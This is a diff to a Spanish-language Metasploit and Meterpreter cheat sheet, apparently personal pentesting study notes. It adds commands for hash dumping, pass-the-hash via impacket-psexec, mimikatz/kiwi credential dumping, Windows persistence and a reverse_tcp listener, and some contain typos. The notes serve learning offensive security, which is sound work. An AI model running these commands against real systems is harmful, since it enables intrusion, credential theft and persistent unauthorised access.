@@ -44,6 +44,9 @@ msf >  search cve:2009 type:exploit platform:-linux
 msf >  search cve:2009 -s name
 msf >  search type:exploit -s type -r
 msf >  search att&ck:T1059
+
+#Podemos buscar progamas para ver si tiene sploits
+msf >  search slmail
 ```
 
 
@@ -93,6 +96,8 @@ msf > set RHOST 192.168.111.0/24
 
 ```bash
 msf > run
+#O
+msf > exploit
 ```
 
 **Ver los equipos detectados para un espacio de trabajo** #metasploit_host
@@ -126,3 +131,102 @@ msf > hosts -C os_name,purpose
 ```
 
 ![](../../../attachments/Pasted%20image%2020260225231601.png)
+
+**Lanzar el sploit pero sin llegar a explotar la vulnerabilidad** #metasploit_check   vale solo si el modulo lo permita
+
+```bash
+msf > auxiliary/scanner/discovery/arp_sweep
+msf > check
+```
+
+![](../../../attachments/Pasted%20image%2020260225232142.png)
+
+**En función de la maquina a la que nos enfrenemos debemos indicar un payload así como el target** #metasploit_payload
+
+```bash
+msf > set target
+msf > set PAYLOAD
+```
+
+
+Tomara captura de pantalla , esto es una ves vulnerada la maquina con una session de meterpreter #meterpreter #meterpreter_screenshot
+```bash
+meterpereter > screenshot 
+```
+
+**Cargar módulos en la session de meterpreter** #meterpreter #meterpreter_load_modulos
+```bash
+#Listar lo que podemos cargar
+meterpereter > load -l
+
+#Cargar un modulo 
+meterpereter > load espia
+meterpereter > help  #Nos muestra todo lo que podemos hacer en la session de meterpreter
+
+
+```
+
+![[Pasted image 20260225233436.png]]
+
+**Dumpear los hashes del sistema** #meterpreter_dump_hashes estos hash los podemos utilizar para hacer un **Pass the Hash** que sin la pass de un user puedo acceder como el 
+```bash
+meterpereter >hashdump
+
+```
+
+![](../../../attachments/Pasted%20image%2020260225234811.png)
+
+**PASS THE HASH**
+```bash
+impacket-psexcec WORKGROUP/alex@192.168.33.111 -hashes :hash_usuario 
+```
+
+![](../../../attachments/Pasted%20image%2020260225234553.png)
+
+Ejecutar una tarea privilegiada mediante un binario llamado #mimicats para dumpear las credenciales almacenadas en memoria. Esto es teniendo una session de meterpreter como Admin  
+```bash
+meterpreter >load kiwi
+meterpreter >help
+meterpreter >creds_all
+```
+
+![](../../../attachments/Pasted%20image%2020260225235340.png)
+
+Poner una session en segundo plano #meterpreter_segundo_plano
+```bash
+meterpreter > background  #Poner una session en segundo plano
+meterpreter > session id  #Para entrar en la session deseada
+```
+
+Persistencia con #metasploit  #metasploit_persistencia
+```bash
+#Ponemos la session en background y con metasploit buscamos un modulo de persistencia
+
+msf > search persistence platform:"windows"
+msf > use exploit/windows/local/persistence_service
+msf > show option  #Este modulo en particulas lo que solicita es una session 
+msf > sessions
+msf > set SESSION id_session
+msf > run
+
+```
+
+![](../../../attachments/Pasted%20image%2020260226001014.png)
+
+![](../../../attachments/Pasted%20image%2020260226001136.png)
+
+**Generar una session de escucha**para la #metasploit_listener 
+```bash
+msf > use exploit/multi/handler
+msf > show options
+msf > set payloads windows/meterpreter/reverse_tcp
+msf > set LHOST ip_atacante
+msf > set LPORT port_escucha
+msf > run
+```
+
+
+Migrar de una session de multi handler a una de meterpreter
+```bash
+msf6 exploit(multi/handler) > sessions -u 1
+```
